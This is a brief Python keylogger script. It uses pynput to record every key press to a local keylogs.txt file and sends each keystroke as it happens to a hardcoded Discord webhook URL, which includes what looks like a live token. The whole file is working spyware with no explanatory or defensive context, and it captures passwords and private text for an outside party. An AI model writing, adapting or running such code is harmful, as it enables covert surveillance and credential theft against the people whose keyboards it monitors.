#import some stuff

from pynput.keyboard import Key, Listener
from dhooks import Webhook #pip install dhooks
import logging

log_dir = ""

# URL HERE
log_send = Webhook('https://discord.com/api/webhooks/1186985510242107413/WBRGMxPdJshFgeiB_J7gOOSQAIaUzghY56qA423ztlf1vulXCsj1-16kzWCbC2JsEVJs')

#save the file as keylogs.txt

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')
    #print("action 1")

#log_send.send('DBG')

def on_press(key):
    logging.info(str(key))

    #print the key
    print(key)

    #log the key
    log_send.send(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
